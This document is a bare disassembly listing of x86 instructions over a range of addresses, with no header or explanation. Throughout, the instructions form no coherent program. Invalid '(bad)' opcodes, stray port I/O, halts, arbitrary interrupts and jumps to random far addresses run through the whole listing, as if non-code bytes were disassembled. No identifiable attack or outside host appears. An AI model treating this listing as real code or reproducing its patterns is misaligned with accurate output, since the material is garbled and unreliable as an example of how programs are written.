  427c94:	loope  0x427c7f
  427c96:	ret    
  427c97:	int    0xda
  427c99:	retf   
  427c9a:	clc    
  427c9b:	mov    eax,0xdcd8b4cf
  427ca0:	ret    
  427ca1:	mov    eax,0xfbccf4fb
  427ca6:	jecxz  0x427cac
  427ca8:	cmc    
  427ca9:	fld    QWORD PTR [edx]
  427cab:	std    
  427cac:	hlt    
  427cad:	retf   0xe8fb
  427cb0:	shl    ecx,cl
  427cb2:	mov    ebp,0xc6f6d2e4
  427cb7:	out    0xc9,al
  427cb9:	call   0xf132556e
  427cbe:	hlt    
  427cbf:	add    edi,eax
  427cc1:	out    dx,al
  427cc2:	clc    
  427cc3:	(bad)  
  427cc4:	mov    ebp,0xaf70602
  427cc9:	add    ah,dh
  427ccb:	fcmovne st,st(1)
  427ccd:	int    0xee
  427ccf:	out    dx,eax
  427cd0:	fmul   st(3),st
  427cd2:	test   eax,0xc0c7d1d2
  427cd7:	into   
  427cd8:	(bad)  
  427cd9:	int    0xde
  427cdb:	sti    
  427cdc:	into   
  427cdd:	mov    ch,0xf6
  427cdf:	mov    esi,0xd4f5c2d5
  427ce4:	push   esi
  427ce6:	cmc    
  427ce7:	hlt    
  427ce8:	loopne 0x427cab
  427cea:	jmp    0x427cd9
  427cec:	fsubp  st(0),st
  427cee:	add    al,0x7
  427cf0:	mov    ebp,0xc7b3c1b8
  427cf5:	repz (bad) 
  427cf7:	(bad)  
  427cf9:	clc    
  427cfa:	sti    
  427cfb:	stc    
  427cfc:	in     eax,0xbf
  427cfe:	int    0xd7
  427d00:	fsubr  st(3),st
  427d02:	(bad)  
  427d03:	out    0xe0,al
  427d05:	in     al,dx
  427d06:	ffree  st(1)
  427d08:	retf   0xe5f4
  427d0b:	test   BYTE PTR [edx],0xe7
  427d0e:	out    0xc9,al
  427d10:	icebp  
  427d11:	mov    esp,0xf4c9a8c4
  427d16:	leave  
  427d17:	shl    ebp,cl
  427d19:	(bad)  
  427d1a:	rcr    ebp,cl
  427d1c:	in     al,dx
  427d1d:	mov    ecx,0xdeddd1
  427d22:	out    dx,eax
  427d23:	fidivr WORD PTR [edi-0x3c25fe20]
  427d29:	fdiv   st(4),st
  427d2b:	or     edi,edx
  427d2d:	fisttp QWORD PTR ds:0xe1aecacf
  427d33:	(bad)  
  427d34:	mov    al,0xd0
  427d36:	mov    ch,0xc0
  427d38:	int    0xed
  427d3a:	into   
  427d3b:	sti    
  427d3c:	std    
  427d3d:	in     al,dx
  427d3e:	cli    
  427d3f:	jecxz  0x427d04
  427d41:	test   dh,0xe1
  427d44:	(bad)  
  427d45:	mov    ebp,0x4cafeff
  427d4a:	loopne 0x427d5a
  427d4c:	inc    BYTE PTR [ebx]
  427d4e:	leave  
  427d4f:	iret   
  427d50:	mov    edi,0xc6cde9eb
  427d55:	cmc    
  427d56:	mov    bh,0xc5
  427d58:	clc    
  427d59:	stc    
  427d5a:	rcr    ch,1
  427d5c:	std    
  427d5d:	enter  0xbadb,0xc2
  427d61:	cmc    
  427d62:	mov    ch,0x3
  427d64:	inc    eax
  427d66:	or     ah,bl
  427d68:	push   es
  427d69:	add    al,BYTE PTR [ebx]
  427d6b:	or     esi,ebp
  427d6d:	enter  0xec04,0xa9
  427d71:	mov    al,0xad
  427d73:	into   
  427d74:	(bad)  
  427d75:	retf   
  427d76:	mov    bh,0xc8
  427d78:	aam    0xae
  427d7a:	aad    0xb5
  427d7c:	int    0xbb
  427d7e:	mov    ch,0xe1
  427d80:	fprem1 
  427d82:	fiadd  WORD PTR [edi]
  427d84:	fadd   st,st(5)
  427d86:	jecxz  0x427d61
  427d88:	shr    dl,0xfc
  427d8b:	jmp    0x427d69
  427d8d:	fisttp WORD PTR [ebx]
  427d8f:	iret   
  427d90:	stos   DWORD PTR es:[edi],eax
  427d91:	mov    esp,0xeacdd0ed
  427d96:	leave  
  427d97:	loope  0x427d87
  427d99:	sar    dh,cl
  427d9b:	mov    ecx,0xd6f5c4b8
  427da0:	imul   ebp
  427da2:	into   
  427da3:	fucom  st(2)
  427da5:	stc    
  427da6:	jecxz  0x427da1
  427da8:	cmc    
  427da9:	ror    BYTE PTR [esi],0xf8
  427dac:	leave  
  427dad:	(bad)  
  427daf:	int3   
  427db0:	icebp  
  427db1:	mov    esp,0xcab6c5f7
  427db6:	repz in eax,0xf0
  427db9:	iret   
  427dba:	jmp    0xea384397
  427dbf:	enter  0xfcbe,0xd3
  427dc3:	loope  0x427d8a
  427dc5:	cmc    
  427dc6:	ffree  st(3)
  427dc8:	stc    
  427dc9:	jmp    0xdc0687d8
  427dce:	repz repz fcomp st(7)
  427dd2:	rcl    ebx,1
  427dd4:	aam    0xb5
  427dd6:	icebp  
  427dd7:	retf   
  427dd8:	aam    0xfb
  427dda:	(bad)
  427ddd:	into   
  427dde:	mov    esp,0xcc00bad0
  427de3:	(bad)  
  427de4:	(bad)  
  427de6:	pop    es
  427de7:	sar    ch,cl
  427de9:	aad    0xc6
  427deb:	cld    
  427dec:	jmp    0xe1e5:0xcae2fdfb
  427df3:	rcr    ebp,cl
  427df5:	loopne 0x427dc0
  427df7:	lods   al,BYTE PTR ds:[esi]
  427df8:	rol    ah,cl
  427dfa:	(bad)  
  427dfb:	enter  0xe9dd,0xf9
  427dff:	out    dx,eax
  427e00:	fst    st(2)
  427e02:	shl    bh,0xc5
  427e05:	jecxz  0x427ddd
  427e07:	sti    
  427e08:	or     ebx,ebp
  427e0a:	add    al,0xff
  427e0c:	int    0xb
  427e0e:	shl    ebp,cl
  427e10:	test   al,0xa8
  427e12:	shl    ebx,0xc5
  427e15:	shr    dh,cl
  427e17:	mov    edx,0xeff1e8b6
  427e1c:	mov    bh,0xcb
  427e1e:	jecxz  0x427e02
  427e20:	sti    
  427e21:	add    BYTE PTR [ebp-0x20f80c43],dh
  427e27:	add    eax,0xc9f5c7fb
  427e2c:	(bad)  
  427e2d:	in     al,0x5
  427e2f:	add    ebx,eax
  427e31:	rcr    ch,0xb3
  427e34:	jmp    0xfbcc:0xf8b4f6b4
  427e3b:	fadd   st,st(5)
  427e3d:	fdiv   st,st(1)
  427e3f:	mov    esp,0xf3cce2bd
  427e44:	fadd   st(1),st
  427e46:	(bad)  
  427e47:	rcr    bl,1
  427e49:	add    eax,DWORD PTR [esi]
  427e4b:	stc    
  427e4c:	lds    eax,FWORD PTR ds:0xb0e5dafb
  427e52:	jecxz  0x427e06
  427e54:	int    0xb6
  427e56:	(bad)  
  427e57:	(bad)  
  427e58:	retf   
  427e59:	fadd   st,st(4)
  427e5b:	out    0xd2,al
  427e5d:	sar    BYTE PTR [ebp-0x3fe2645],1
  427e63:	int3   
  427e64:	ror    BYTE PTR [ebx],1
  427e66:	repz out 0xe9,al
  427e69:	(bad)  
  427e6a:	sti    
  427e6b:	add    DWORD PTR [eax],eax
  427e6d:	add    dl,BYTE PTR [edx]
  427e6f:	out    0xbf,eax
  427e71:	int3   
  427e72:	(bad)
  427e76:	ret    0xb0b7
  427e79:	jmp    0xd0313836
  427e7e:	mov    esi,0x2c2d9fb
  427e83:	out    dx,al
  427e84:	fcomp  st(1)
  427e86:	(bad)  
  427e87:	out    0x2,al
  427e89:	cld    
  427e8a:	or     dh,ah
  427e8c:	jecxz  0x427e70
  427e8e:	into   
  427e8f:	add    dh,BYTE PTR [edx-0x3d095124]
  427e95:	rol    dl,cl
  427e97:	aad    0xf8
  427e99:	repnz in al,dx
  427e9b:	in     al,0xe4
  427e9d:	(bad)  
  427e9e:	aam    0x3
  427ea0:	(bad)  
  427ea2:	repz sar dh,1
  427ea5:	add    eax,0xca05f4bd
  427eaa:	fucomip st,st(5)
  427eac:	movntq (bad),mm7
  427ead:	out    0xf9,eax
  427eaf:	(bad)  
  427eb1:	(bad)  
  427eb2:	jmp    0xb1ce:0xdbd4e8ed
  427eb9:	leave  
  427eba:	(bad)  
  427ebc:	(bad)  
  427ebe:	mov    eax,0xc1dff7c8
  427ec3:	in     eax,0xdc
  427ec5:	ret    
  427ec6:	jecxz  0x427e8c
  427ec8:	shl    cl,0xfd
  427ecb:	enter  0x7eb,0xdb
  427ecf:	retf   
  427ed0:	mov    eax,0xb3deb2dc
  427ed5:	xlat   BYTE PTR ds:[ebx]
  427ed6:	mov    ebx,0xd5b4d8c0
  427edb:	(bad)  
  427edd:	stc    
  427ede:	test   DWORD PTR [edx],0xc202bebe
  427ee4:	fld    st(4)
  427ee6:	cmc    
  427ee7:	icebp  
  427ee8:	jmp    0xf02559e4
  427eed:	add    ah,ah
  427eef:	retf   0xcdca
  427ef2:	lods   al,BYTE PTR ds:[esi]
  427ef3:	mov    bl,0xf7
  427ef5:	mov    al,0xc7
  427ef7:	cmc    
  427ef8:	cmc    
  427ef9:	(bad)  
  427efa:	out    0xce,al
  427efc:	idiv   DWORD PTR [edi-0x24224b29]
  427f02:	(bad)  
  427f04:	dec    BYTE PTR [ebx]
  427f06:	ret    
  427f07:	(bad)  
  427f09:	push   es
  427f0a:	lsl    esp,cx
  427f0d:	or     cl,ch
  427f0f:	repz mov dl,0xf1
  427f12:	call   0xdc3966fa
  427f17:	lock loope 0x427f11
  427f1a:	fbstp  TBYTE PTR [ebp-0xf054213]
  427f20:	mov    ecx,0xbbd9e6e7
  427f25:	in     al,dx
  427f26:	out    0xf6,eax
  427f28:	retf   0xe2eb
  427f2b:	hlt    
  427f2c:	fxam   
  427f2e:	(bad)  
  427f30:	lods   al,BYTE PTR ds:[esi]
  427f31:	test   al,0xc1
  427f33:	rol    ebx,1
  427f35:	in     al,0xb6
  427f37:	neg    al
  427f39:	repnz iret 
  427f3b:	out    dx,al
  427f3c:	rcl    ecx,1
  427f3e:	(bad)  
  427f3f:	faddp  st(1),st
  427f41:	mov    edi,0xd1c605d5
  427f46:	ror    edx,0xe3
  427f49:	leave  
  427f4a:	cli    
  427f4b:	push   cs
  427f4c:	(bad)  
  427f4d:	jmp    0xb1eb823f
  427f52:	in     eax,dx
  427f53:	enter  0xb1ee,0xf0
  427f57:	hlt    
  427f58:	mov    bl,0xb4
  427f5a:	mov    edx,0xd7f9f4ac
  427f5f:	mov    eax,0xf0f1f8d0
  427f64:	(bad)  
  427f65:	in     al,dx
  427f66:	(bad)  
  427f68:	loop   0x427f28
  427f6a:	push   es
  427f6b:	fcomp  st(7)
  427f6d:	int3   
  427f6e:	jmp    0xf2c5:0xe1eae106
  427f75:	fadd   st(5),st
  427f77:	out    0xe5,eax
  427f79:	mov    ah,0xf0
  427f7b:	(bad)  
  427f7c:	aam    0xc8
  427f7e:	jmp    0xc125734b
  427f83:	xlat   BYTE PTR ds:[ebx]
  427f84:	in     al,0xe6
  427f86:	(bad)  
  427f87:	jmp    0xe42d6162
  427f8c:	retf   
  427f8d:	add    BYTE PTR ds:0xd2c9c411,cl
  427f93:	in     al,0xcf
  427f95:	sar    edx,1
  427f97:	mov    cl,0xf0
  427f99:	repz mov al,0xcf
  427f9c:	enter  0xf3e9,0xd2
  427fa0:	sar    esp,0xdf
  427fa3:	(bad)  
  427fa4:	aam    0xd9
  427fa6:	(bad)  
  427fa8:	ret    
  427fa9:	inc    DWORD PTR [ecx]
  427fab:	clc    
  427fac:	cmc    
  427fad:	or     al,BYTE PTR ds:0xf3e7b3eb
  427fb3:	test   al,0xb6
  427fb5:	cmc    
  427fb6:	loope  0x427f8c
  427fb8:	(bad)  
  427fba:	hlt    
  427fbb:	mov    dh,0xb7
  427fbd:	fucomip st,st(6)
  427fbf:	(bad)  
  427fc0:	mov    esp,0x1f8bced
  427fc5:	(bad)  
  427fc7:	rol    DWORD PTR [eax],0x7
  427fca:	add    ebx,ecx
  427fcc:	aam    0xe0
  427fce:	sti    
  427fcf:	in     al,dx
  427fd0:	shr    DWORD PTR [ebp-0x2f331338],1
  427fd6:	fucomi st,st(3)
  427fd8:	mov    ecx,0xe9edd2c6
  427fdd:	mov    ebp,0xccf6f5bd
  427fe2:	imul   esi
  427fe4:	ret    
  427fe5:	sar    BYTE PTR [ebp-0x34213d02],0xd6
  427fec:	add    al,0xf8
  427fee:	(bad)  
  427fef:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ff1:	ret    
  427ff2:	jmp    0xc9db:0xd4f5d6f0
  427ff9:	lds    esi,FWORD PTR [ebp-0x45003245]
  427fff:	neg    ebx
  428001:	fdivrp st(0),st
  428003:	int3   
  428004:	add    BYTE PTR [edi],al
  428006:	std    
  428007:	add    eax,ebp
  428009:	shl    bh,0xe
  42800c:	hlt    
  42800d:	psubb  mm3,mm0
  428010:	fsubr  QWORD PTR [ecx-0xd142114]
  428016:	lock mov dh,0xca
  428019:	out    dx,al
  42801a:	rcl    dl,cl
  42801c:	(bad)  
  42801d:	in     eax,dx
  42801e:	(bad)  
  428020:	test   edx,0xe5f5c7d2
  428026:	mov    ecx,0x9cbe5f4
  42802b:	into   
  42802c:	ret    
  42802d:	in     al,0xe5
  42802f:	or     al,0xee
  428031:	rol    edi,0xcc
  428034:	repz loopne 0x42801c
  428037:	in     eax,0xe6
  428039:	mov    ah,0xe6
  42803b:	cmc    
  42803c:	icebp  
  42803d:	(bad)  
  42803f:	retf   0xdef5
  428042:	std    
  428043:	jecxz  0x428017
  428045:	lock mov esp,0x2dee5c2
  42804b:	in     al,0xe4
  42804d:	jmp    0xc2cc:0xbdca0aea
  428054:	xlat   BYTE PTR ds:[ebx]
  428055:	ret    0xc0fb
  428058:	mov    ebx,0xcbedd4f1
  42805d:	int3   
  42805e:	icebp  
  42805f:	stc    
  428060:	in     eax,dx
  428061:	into   
  428062:	cli    
  428063:	pop    es
  428064:	in     eax,0xc4
  428066:	rol    DWORD PTR [esi],1
  428068:	retf   
  428069:	push   es
  42806a:	jecxz  0x42804f
  42806c:	retf   0xcd
  42806f:	or     al,0xc3
  428071:	rcl    ebx,cl
  428073:	out    0xe1,al
  428075:	xlat   BYTE PTR ds:[ebx]
  428076:	enter  0xeaf5,0xcc
  42807a:	int    0xfb
  42807c:	fcom   st(1)
  42807e:	retf   0xd1f0
  428081:	sar    ecx,cl
  428083:	(bad)  
  428085:	mov    al,0xf8
  428088:	pop    es
  428089:	fcmovnu st,st(6)
  42808b:	cli    
  42808c:	ret    
  42808d:	leave  
  42808e:	out    0x9,al
  428090:	loope  0x428053
  428092:	rol    bh,1
  428094:	shr    ecx,0xac
  428097:	cmc    
  428098:	sar    BYTE PTR [edx-0x82b2f2c],cl
  42809e:	fsqrt  
  4280a0:	add    bh,bl
  4280a2:	into   
  4280a3:	cld    
  4280a4:	(bad)  
  4280a5:	shl    eax,1
  4280a7:	(bad)
  4280aa:	jmp    0xbe13:0xf3ebd4dd
  4280b1:	int3   
  4280b2:	repnz loop 0x4280a2
  4280b5:	stos   BYTE PTR es:[edi],al
  4280b6:	rcl    edx,0xe6
  4280b9:	jmp    0xf2d1:0xbfeee4bb
  4280c0:	(bad)  
  4280c2:	div    esi
  4280c4:	out    0xba,eax
  4280c6:	shl    ebp,1
  4280c8:	fnclex 
  4280ca:	or     cl,cl
  4280cc:	add    ch,bl
  4280ce:	adc    cl,BYTE PTR [esi]
  4280d0:	mov    esi,0xd5ddc3e4
  4280d5:	icebp  
  4280d6:	jmp    0x42809e
  4280d8:	in     eax,0xd2
  4280da:	mov    edx,0xc3bacef3
  4280df:	ret    
  4280e0:	sti    
  4280e1:	in     eax,dx
  4280e2:	(bad)  
  4280e3:	lock fsubr st(1),st
  4280e6:	ffree  st(6)
  4280e8:	mov    dl,0xf7
  4280eb:	(bad)  
  4280ec:	out    dx,eax
  4280ed:	jecxz  0x4280d7
  4280ef:	(bad)  
  4280f1:	loopne 0x4280c5
  4280f3:	repnz test esp,0xefc6b6ee
  4280fa:	aam    0xd6
  4280fc:	mov    esi,0xbbf5f6be
  428101:	out    dx,al
  428102:	call   ebx
  428104:	mov    edi,0xd7f1f201
  428109:	in     al,0xee
  42810b:	(bad)  
  42810e:	push   es
  42810f:	adc    cl,dl
  428111:	jecxz  0x4280d9
  428113:	jmp    0xd22b6cd4
  428118:	rol    ch,0xd2
  42811b:	repz mov bl,0xb4
  42811e:	leave  
  42811f:	add    edx,esp
  428121:	fcmovnbe st,st(6)
  428123:	(bad)  
  428125:	aad    0xfb
  428127:	retf   
  428128:	add    edx,esp
  42812a:	out    0xc8,eax
  42812c:	(bad)  
  42812d:	std    
  42812e:	add    dh,cl
  428130:	test   eax,0xb0a8afee
  428135:	(bad)  
  428136:	repnz cli 
  428138:	mov    ah,0xf0
  42813a:	(bad)  
  42813c:	lock mov dl,0xde
  42813f:	(bad)  
  428140:	out    dx,eax
  428141:	pop    es
  428142:	aad    0xd0
  428144:	clc    
  428145:	repnz xlat BYTE PTR ds:[ebx]
  428147:	jmp    0xdc0a5248
  42814c:	(bad)  
  42814e:	push   cs
  42814f:	or     al,0xcd
  428151:	rcr    esi,0xee
  428154:	icebp  
  428155:	(bad)  
  428156:	int3   
  428157:	into   
  428158:	jmp    0xd7fd4f2e
  42815d:	std    
  42815e:	retf   
  42815f:	fxch   st(7)
  428161:	dec    bh
  428163:	cmc    
  428164:	repz sar cl,cl
  428167:	fadd   DWORD PTR ds:0xc4cac7c2
  42816d:	int    0xc
  42816f:	in     eax,0xe7
  428171:	shl    edx,1
  428173:	out    dx,eax
  428174:	jmp    0x428120
  428176:	not    ah
  428178:	cmc    
  428179:	ror    ah,0xcc
  42817c:	clc    
  42817d:	f2xm1  
  42817f:	(bad)  
  428180:	fneni(8087 only) 
  428182:	into   
  428183:	loop   0x42818c
  428185:	fsub   st,st(4)
  428187:	repnz sti 
  428189:	push   es
  42818a:	add    ebp,ebx
  42818c:	in     al,dx
  42818d:	(bad)
  428190:	ret    0xebc1
  428193:	mov    dh,0xb7
  428195:	mul    cl
  428197:	shl    ah,1
  428199:	not    bl
  42819b:	test   dl,0xd4
  42819e:	enter  0xd5fa,0xd4
  4281a2:	fidivr WORD PTR [esi+0x2db07f8]
  4281a8:	or     ecx,DWORD PTR [ecx]
  4281aa:	aam    0xe1
  4281ac:	jecxz  0x4281b0
  4281ae:	psubusb mm5,mm3
  4281b1:	call   0xf0f85f94
  4281b6:	loope  0x42819d
  4281b8:	lock (bad) 
  4281ba:	(bad)  
  4281bb:	push   eax
  4281bd:	(bad)  
  4281bf:	(bad)  
  4281c1:	add    esp,edx
  4281c3:	int    0xc2
  4281c5:	std    
  4281c6:	or     dl,bh
  4281c8:	fsub   st,st(7)
  4281ca:	push   cs
  4281cb:	(bad)  
  4281cc:	dec    BYTE PTR [ecx]
  4281ce:	out    dx,al
  4281cf:	in     al,0xe4
  4281d1:	in     eax,dx
  4281d2:	repz repz shr BYTE PTR [ebp-0xa30313f],cl
  4281da:	(bad)  
  4281db:	fcmove st,st(7)
  4281dd:	mov    ch,0xb9
  4281df:	mov    edi,0xf7f5c1f4
  4281e4:	std    
  4281e5:	not    dh
  4281e7:	in     al,0xd0
  4281e9:	rol    cl,0xf9
  4281ec:	or     esp,eax
  4281ee:	leave  
  4281ef:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4281f1:	mov    dl,0xe5
  4281f3:	rcl    ecx,0xd3
  4281f6:	jmp    0x4281e4
  4281f8:	in     eax,0xb5
  4281fa:	out    0xfa,al
  4281fc:	mov    ecx,0xd0c8dab5
  428201:	loop   0x4281c5
  428203:	out    0xcd,eax
  428205:	fcmovb st,st(0)
  428207:	icebp  
  428208:	ret    0x207
  42820b:	enter  0x8d5,0xe6
  42820f:	or     dl,bl
  428211:	mov    edx,0xc4e7e4ae
  428217:	sti    
  428218:	mov    dl,0xda
  42821a:	in     eax,0xf8
  42821c:	in     eax,dx
  42821d:	(bad)  
  42821e:	fidivr WORD PTR [ecx-0x71c0107]
  428224:	mov    edi,0xfdd6d5
  428229:	or     esp,esp
  42822b:	jmp    0x428217
  42822d:	add    ebx,ecx
  42822f:	out    0xb8,eax
  428231:	(bad)
  428234:	mov    bl,0xcf
  428236:	mov    bh,0xd7
  428238:	aad    0xd1
  42823a:	int    0xc6
  42823c:	mov    ebx,0xb8d9d9b4
  428241:	cmc    
  428242:	rol    BYTE PTR [esi],1
  428244:	test   DWORD PTR [esi],0xf6dceaeb
  42824a:	add    al,0xd5
  42824c:	(bad)  
  42824d:	jmp    0xcccc:0xe7f1eee8
  428254:	aam    0xe7
  428256:	loope  0x428200
  428258:	in     al,0xb9
  42825a:	(bad)
  42825d:	mov    dl,0xdb
  42825f:	add    edi,edi
  428261:	add    al,ah
  428263:	faddp  st(3),st
  428265:	loopne 0x42822d
  428267:	or     esp,edx
  428269:	mov    esi,0x2e9db0b
  42826e:	into   
  42826f:	(bad)  
  428271:	retf   
  428272:	mul    bl
  428274:	(bad)  
  428275:	loop   0x42822a
  428277:	mov    ebx,0xd0ccd1c6
  42827c:	sti    
  42827d:	not    bh
  42827f:	retf   0xcff8
  428282:	add    edi,DWORD PTR [edi-0x3f34001a]
  428288:	add    eax,edx
  42828a:	(bad)  
  42828b:	dec    BYTE PTR [ebx]
  42828d:	out    dx,eax
  42828e:	fld    QWORD PTR [esi]
  428290:	lods   al,BYTE PTR ds:[esi]
  428291:	lock mov ebp,0xcfe6ebc0
  428297:	fldlg2 
  428299:	mov    eax,0xffb8f0cd
  42829e:	sar    BYTE PTR [ebp+ebx*8+0x101c0f7],cl
  4282a5:	mov    ebp,0xe105cbe3
  4282aa:	leave  
  4282ab:	or     eax,0xe9ebc9e5
  4282b0:	mov    cl,0xdf
  4282b2:	in     al,dx
  4282b3:	call   0xc634658a
  4282b8:	mov    dh,0xce
  4282ba:	in     al,dx
  4282bb:	xlat   BYTE PTR ds:[ebx]
  4282bc:	lock enter 0xf7ca,0xbc
  4282c1:	mov    esi,0xd4dce7f2
  4282c6:	mov    ebp,0xc7dbdddc
  4282cb:	test   cl,0xeb
  4282ce:	or     al,0x7
  4282d0:	lds    edi,FWORD PTR [ebp-0x43191251]
  4282d6:	vpsubsb xmm1,xmm6,xmm2
  4282da:	aad    0xef
  4282dc:	mov    esi,0xd0e9f7
  4282e1:	mov    edi,0xf6d1fc
  4282e6:	or     esp,ecx
  4282e8:	fld    DWORD PTR [ecx]
  4282ea:	inc    BYTE PTR [ecx]
  4282ec:	or     cl,BYTE PTR [eax]
  4282ee:	les    eax,FWORD PTR [ecx]
  4282f0:	repnz jmp 0xe0ed:0xcde0aebe
  4282f8:	int3   
  4282f9:	(bad)  
  4282fa:	imul   bh
  4282fc:	clc    
  4282fd:	enter  0xb4da,0xf4
  428301:	cmc    
  428302:	cld    
  428303:	lock icebp 
  428305:	add    al,0xd7
  428307:	mov    eax,0xc7eff8c0
  42830c:	(bad)  
  42830e:	add    eax,0xa8bdb2c0
  428313:	in     al,0xeb
  428315:	out    0xe1,al
  428317:	icebp  
  428318:	(bad)  
  428319:	repz int3 
  42831b:	into   
  42831c:	fcomi  st,st(2)
  42831e:	not    edx
  428320:	fxch   st(0)
  428322:	shl    dh,1
  428324:	mov    dh,0x4
  428327:	rcr    dl,cl
  428329:	loopne 0x428314
  42832b:	(bad)  
  42832c:	out    0xe4,al
  42832e:	pop    es
  42832f:	out    dx,al
  428330:	sar    DWORD PTR [edi-0x132d305b],0xd2
  428337:	in     eax,0xf3
  428339:	mov    dh,0xf8
  42833b:	(bad)
  42833e:	loop   0x42831d
  428340:	out    dx,al
  428341:	lock fcmovb st,st(1)
  428344:	fstp   TBYTE PTR [ebp-0x10150610]
  42834a:	fmul   st(6),st
  42834c:	or     al,0xcd
  42834e:	push   es
  42834f:	or     bh,ch
  428351:	(bad)
  428355:	iret   
  428356:	out    dx,al
  428357:	lock mov cl,0xce
  42835a:	in     al,0xf5
  42835c:	clc    
  42835d:	not    ah
  42835f:	fxch   st(7)
  428361:	stc    
  428362:	iret   
  428363:	sti    
  428364:	int3   
  428365:	fcmovnu st,st(7)
  428367:	repnz loop 0x428372
  42836a:	hlt    
  42836b:	or     edi,edi
  42836d:	jmp    0xc4c9:0xe1c2fdd8
  428374:	(bad)  
  428375:	in     eax,0xd7
  428377:	cli    
  428378:	hlt    
  428379:	shl    ah,cl
  42837b:	jmp    0xf7c2:0xdef4fcec
  428382:	add    edi,esp
  428384:	ret    0xad1
  428387:	rol    eax,0xb
  42838a:	cmc    
  42838b:	add    dl,cl
  42838d:	push   es
  42838e:	add    eax,0xe5c6b3ff
  428393:	into   
  428394:	mov    al,0xe1
  428396:	leave  
  428397:	repnz out dx,eax
  428399:	cli    
  42839a:	mov    dh,0xe8
  42839c:	enter  0xf4bb,0xf5
  4283a0:	cli    
  4283a1:	loopne 0x428372
  4283a3:	rol    DWORD PTR [ecx],0xf7
  4283a6:	fild   DWORD PTR [edx]
  4283a8:	add    eax,0xcee5fdf0
  4283ad:	into   
  4283ae:	retf   
  4283af:	shl    eax,cl
  4283b1:	loop   0x428360
  4283b3:	mov    esi,0xf2b4cbb2
  4283b8:	(bad)  
  4283b9:	call   0x373892
  4283be:	fsub   st,st(3)
  4283c0:	mov    esp,0xbbbebfb6
  4283c5:	sti    
  4283c6:	add    edi,edx
  4283c8:	clc    
  4283c9:	pop    es
  4283ca:	(bad)
  4283cd:	cld    
  4283ce:	pop    es
  4283cf:	enter  0xcbee,0xe7
  4283d3:	test   ebx,0xd6ced1b5
  4283d9:	sti    
  4283da:	enter  0xb7f4,0xc8
  4283de:	add    dh,ah
  4283e0:	cmc    
  4283e1:	rol    dl,1
  4283e3:	into   
  4283e4:	fdiv   st(0),st
  4283e6:	clc    
  4283e7:	loope  0x4283b4
  4283e9:	fsub   st,st(4)
  4283eb:	out    dx,al
  4283ec:	int    0x7
  4283ee:	adc    dh,dl
  4283f0:	shl    ecx,cl
  4283f2:	retf   0xe9cb
  4283f5:	mov    dl,0xd4
  4283f7:	enter  0xfbcc,0xd3
  4283fb:	shr    edx,1
  4283fd:	(bad)  
  4283fe:	xlat   BYTE PTR ds:[ebx]
  4283ff:	sti    
  428400:	icebp  
  428401:	fpatan 
  428403:	mov    eax,0xfbe4f5e0
  428408:	(bad)  
  428409:	aad    0xc9
  42840b:	push   es
  42840c:	aad    0xc
  42840e:	out    0xce,eax
  428410:	(bad)  
  428411:	faddp  st(6),st
  428413:	scas   eax,DWORD PTR es:[edi]
  428414:	mov    al,0xc5
  428416:	in     eax,dx
  428417:	mov    ch,0xf1
  428419:	mov    ch,0xb9
  42841b:	out    0xfc,al
  42841d:	in     eax,dx
  42841e:	leave  
  42841f:	jecxz  0x428424
  428421:	out    dx,al
  428422:	mov    ecx,0xd3d3c7d6
  428427:	rol    BYTE PTR ds:0xcaffea0f,1
  42842d:	add    ebx,ebx
  42842f:	fsubr  DWORD PTR [ebx-0xf502823]
  428435:	in     eax,0xca
  428437:	out    dx,eax
  428438:	loopne 0x428400
  42843a:	mov    edi,0xe2c4ecf0
  42843f:	fcmovne st,st(4)
  428441:	xlat   BYTE PTR ds:[ebx]
  428442:	fbstp  TBYTE PTR [ecx+eax*1-0x150a1f1f]
  428449:	or     eax,ecx
  42844b:	add    eax,0x60813ec
  428450:	loop   0x42840a
  428452:	out    dx,al
  428453:	ret    0xd7dd
  428456:	retf   0xe7c8
  428459:	(bad)  
  42845a:	clc    
  42845b:	mov    ecx,0xece2dcb7
  428460:	mov    ebx,0xbdc7bcfb
  428465:	neg    ebx
  428467:	loopne 0x428466
  428469:	or     edx,esi
  42846b:	fcmovu st,st(6)
  42846d:	int3   
  42846e:	or     edi,esp
  428470:	iret   
  428471:	in     eax,dx
  428472:	ret    
  428473:	imul   BYTE PTR [ebp-0x9045631]
  428479:	mov    ch,0xcc
  42847b:	fsubr  st,st(0)
  42847d:	repnz cli 
  42847f:	mov    edx,0xcee7fbf0
  428484:	fld    QWORD PTR [esi]
  428486:	push   es
  428487:	sti    
  428488:	loopne 0x428482
  42848a:	fcom   st(6)
  42848c:	cmc    
  42848d:	ret    0x9e6
  428490:	(bad)  
  428491:	icebp  
  428492:	imul   al
  428494:	mov    al,0xe1
  428496:	retf   0xf1b5
  428499:	(bad)  [edi-0x2d4b1b28]
  42849f:	clc    
  4284a0:	test   edx,0xf6c0dcdc
  4284a6:	mov    ebp,0xebe0c6e2
  4284ab:	retf   
  4284ac:	out    0xfc,eax
  4284ae:	add    al,0xf
  4284b0:	int3   
  4284b1:	scas   eax,DWORD PTR es:[edi]
  4284b2:	loop   0x4284a0
  4284b4:	hlt    
  4284b5:	vaddsubpd xmm6,xmm7,xmm7
  4284b9:	leave  
  4284ba:	imul   dl
  4284bc:	test   al,0xea
  4284bf:	(bad)  
  4284c1:	aam    0x1
  4284c3:	stc    
  4284c4:	out    0xd3,eax
  4284c6:	retf   
  4284c7:	loopne 0x42848f
  4284c9:	std    
  4284ca:	call   0x1517ea7
  4284cf:	pop    es
  4284d0:	iret   
  4284d1:	test   eax,0xc2c0e8c9
  4284d6:	jmp    0x4284c6
  4284d8:	mov    bh,0xe8
  4284da:	icebp  
  4284db:	test   bl,0xc4
  4284de:	rcr    dl,cl
  4284e0:	out    dx,al
  4284e1:	rol    DWORD PTR [esi],1
  4284e3:	cmc    
  4284e4:	int    0xc0
  4284e6:	out    0xd7,al
  4284e8:	aam    0xcb
  4284ea:	not    dh
  4284ec:	enter  0x12f8,0xef
  4284f0:	int    0xd3
  4284f2:	scas   eax,DWORD PTR es:[edi]
  4284f3:	out    dx,eax
  4284f4:	cmc    
  4284f5:	shl    DWORD PTR [edi-0x11343054],0xf9
  4284fc:	in     al,dx
  4284fd:	into   
  4284fe:	add    esi,DWORD PTR [eax+eax*1-0x412a2230]
  428505:	cli    
  428506:	out    0xb8,eax
  428508:	push   es
  428509:	sar    esi,0xcb
  42850c:	(bad)  
  42850e:	push   es
  42850f:	or     BYTE PTR [esi-0x1f413b51],ch
  428515:	mov    esp,0xc4bae4f4
  42851a:	hlt    
